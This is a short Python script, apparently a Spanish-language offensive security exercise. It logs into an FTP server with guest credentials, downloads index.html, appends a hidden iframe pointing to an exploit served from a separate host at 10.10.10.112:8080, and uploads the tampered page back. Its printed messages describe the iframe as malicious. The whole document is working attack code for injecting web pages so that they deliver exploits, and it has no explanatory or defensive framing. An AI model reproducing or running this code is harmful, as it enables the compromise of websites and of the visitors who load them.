import ftplib


def inyectar_pagina(ftp, page, redirect):
    with open(page + '.tmp', 'w') as file:
        ftp.retrlines('RETR ' + page, file.write)
        print(f'[+] Pagina Descargada: {page}')
        file.write(redirect)

    print(f'[+] Se inyectó iFrame malicioso en: {page}')

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print(f'[+] Se subio pagina inyectada: {page}')


if __name__ == "__main__":
    tgt_host = '192.168.95.179'
    username = 'guest'
    password = 'guest'

    conn = ftplib.FTP(tgt_host)
    conn.login(username, password)

    redirect_html = '<iframe src="http:\\\\10.10.10.112:8080\\exploit">' \
                    '</iframe>'
    inyectar_pagina(conn, 'index.html', redirect_html)
